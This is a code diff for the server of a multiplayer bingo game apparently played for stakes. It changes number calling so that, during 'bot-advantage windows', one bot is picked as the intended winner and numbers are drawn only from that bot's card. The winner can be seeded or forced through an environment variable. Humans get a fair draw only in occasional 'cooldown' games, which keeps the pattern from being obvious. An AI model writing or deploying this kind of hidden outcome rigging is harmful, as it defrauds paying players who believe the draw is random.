@@ -160,6 +160,9 @@ const FULL_NUMBER_POOL = Array.from({ length: 75 }, (_, i) => i + 1);
 // - then block bot bingo claims for BOT_HUMAN_ALLOW_GAMES games
 const BOT_WIN_STREAK_LIMIT = Number(process.env.BOT_WIN_STREAK_LIMIT || '15');
 const BOT_HUMAN_ALLOW_GAMES = Number(process.env.BOT_HUMAN_ALLOW_GAMES || '3');
+// Optional override: during bot-advantage windows, force choosing this bot (by userId) as the "winner bot".
+// If unset, a winner bot is chosen deterministically per game from the bots who joined.
+const BOT_WINNER_USER_ID = String(process.env.BOT_WINNER_USER_ID || '').trim();
 
 function getRoomsForStake(stake) {
     if (!rooms.has(stake)) rooms.set(stake, []);
@@ -712,8 +715,8 @@ async function startGame(room) {
     });
 
     // Option B (biased calling):
-    // - During bot-advantage windows: draw called numbers only from ONE bot's chosen cartela grid.
-    // - During human-advantage (bot cooldown) windows: draw called numbers only from ONE human's chosen cartela grid.
+    // - During bot-advantage windows: pick ONE bot as the intended winner, then draw only from that bot's selected cartela numbers.
+    // - During human-advantage (bot cooldown) windows: draw normally from 1..75 (no bias).
     try {
         const selectedUserIds = Array.from(room.selectedPlayers || []);
         room.botUserIds = new Set();
@@ -729,18 +732,22 @@ async function startGame(room) {
 
         const gameSeed = String(room.currentGameId || '') + '_' + String(room.stake || '');
 
+        // Bot-advantage pool (single winner bot)
         const botUserList = Array.from(room.botUserIds).sort((a, b) => String(a).localeCompare(String(b)));
-        const humanUserList = Array.from(room.humanUserIds).sort((a, b) => String(a).localeCompare(String(b)));
+        const seededIdx = botUserList.length > 0 ? (hashStringToInt(gameSeed) % botUserList.length) : 0;
+        const seededBotUserId = botUserList.length > 0 ? botUserList[seededIdx] : null;
+        const overrideBotUserId =
+            BOT_WINNER_USER_ID && botUserList.includes(BOT_WINNER_USER_ID) ? BOT_WINNER_USER_ID : null;
+        const winnerBotUserId = overrideBotUserId || seededBotUserId;
 
-        const botTargetUserId = botUserList.length > 0 ? botUserList[hashStringToInt(gameSeed) % botUserList.length] : null;
-        const humanTargetUserId = humanUserList.length > 0 ? humanUserList[hashStringToInt(gameSeed) % humanUserList.length] : null;
-
-        room.botNumberPool = botTargetUserId ? getNumbersFromSingleCartela(room, botTargetUserId, gameSeed) : [];
-        room.humanNumberPool = humanTargetUserId ? getNumbersFromSingleCartela(room, humanTargetUserId, gameSeed) : [];
-
-        // Fallback to the full number set if a pool is empty (safety).
+        room.winnerBotUserId = winnerBotUserId || null;
+        room.botNumberPool = winnerBotUserId
+            ? getNumbersFromSingleCartela(room, winnerBotUserId, gameSeed)
+            : FULL_NUMBER_POOL;
         room.botNumberPool = room.botNumberPool.length > 0 ? room.botNumberPool : FULL_NUMBER_POOL;
-        room.humanNumberPool = room.humanNumberPool.length > 0 ? room.humanNumberPool : FULL_NUMBER_POOL;
+
+        // Human-advantage pool: normal 1..75
+        room.humanNumberPool = FULL_NUMBER_POOL;
 
         room.activeNumberPool = room.botCooldownGamesLeft > 0 ? room.humanNumberPool : room.botNumberPool;
     } catch (e) {
